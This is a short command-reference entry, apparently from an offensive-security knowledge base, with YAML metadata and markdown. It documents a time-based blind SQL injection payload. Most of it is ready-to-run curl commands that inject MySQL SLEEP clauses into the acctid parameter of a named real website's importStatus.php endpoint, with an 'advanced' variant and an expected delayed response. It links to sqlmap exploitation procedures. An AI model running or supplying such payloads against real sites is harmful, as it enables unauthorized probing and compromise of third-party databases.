---
data: >-
  curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND (SELECT
  8327 FROM (SELECT(SLEEP(5)))yrDl)"
tags:
  - sqli
  - payload
  - time-based
type: command
output: Delayed response (5 seconds) indicating successful injection
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.312Z'
id: 65ffd144-2e43-4661-967d-5a2ac9e5160d
verified: false
validated: true
submitted: true
---
# time-based-sqli-payload

## Command

```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)"
```

## Description

Executes a time-based blind SQL Injection payload using MySQL's SLEEP function to infer vulnerability through response delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `acctid` | Injected value causing delay if vulnerable | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)"
```

### Advanced Usage

```bash
curl -m 10 "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND IF(1=1,SLEEP(5),0)"
```

## Expected Output

Response delayed by 5 seconds, confirming time-based injection.

## Related

- [[commands/boolean-sqli-payload]]
- [[procedures/Exploit-SQL-Injection-with-sqlmap]]
